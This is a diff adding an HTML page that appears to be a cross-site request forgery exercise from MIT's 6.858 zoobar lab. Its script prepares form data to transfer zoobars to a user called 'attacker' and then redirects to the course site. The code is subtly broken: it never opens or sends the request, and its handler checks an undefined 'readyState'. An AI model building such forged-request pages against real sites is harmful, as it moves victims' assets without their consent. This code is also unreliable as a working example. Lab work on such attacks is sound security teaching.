@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<script>
+var req = new XMLHttpRequest();
+var data = new FormData();
+data.append("recipient", "attacker");
+data.append("zoobars", "1");
+req.onreadystatechange = function(){
+    if(readyState === 4){
+         window.location.href="http://css.csail.mit.edu/6.858/2014/"
+    }
+}
+</script>
+
+</body>
+</html>
